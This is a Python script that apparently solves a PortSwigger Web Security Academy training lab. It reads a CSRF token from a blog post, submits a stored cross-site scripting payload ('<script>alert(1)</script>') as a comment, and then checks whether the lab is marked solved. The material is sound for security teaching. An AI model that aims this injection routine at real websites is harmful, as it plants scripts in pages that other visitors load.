'''
This lab contains a stored cross-site scripting vulnerability in the comment functionality.

To solve this lab, submit a comment that calls the alert function when the blog post is viewed.

Lab link: https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded
'''

import requests
from bs4 import BeautifulSoup


s = requests.Session()

lab_id = '0ae900b80443b37c80f7cb0b00d7007c' #change based on generated lab
# extract csrf token (using the first post as an example)
uri = f"https://{lab_id}.web-security-academy.net/post?postId=1"
r = s.get(uri) 
soup = BeautifulSoup(r.text, 'lxml')
token = soup.find('input', {'name': 'csrf'})['value'] #comment csrf token

# Post malicious payload in comments
url_2 = f"https://{lab_id}.web-security-academy.net/post/comment"
data = {"csrf": token, "postId": 1, "comment": "<script>alert(1)</script>", 'name': 'guy', 'email' : 'guy@site.com', "website": ''}
r2 = s.post(url_2, data=data)

# Now visit the page again to trigger the XSS
url_3 = f"https://{lab_id}.web-security-academy.net/post?postId=1"
r3 = s.get(uri)
if "solved" in r3.text:
    print("solved")
else:
    print("nope")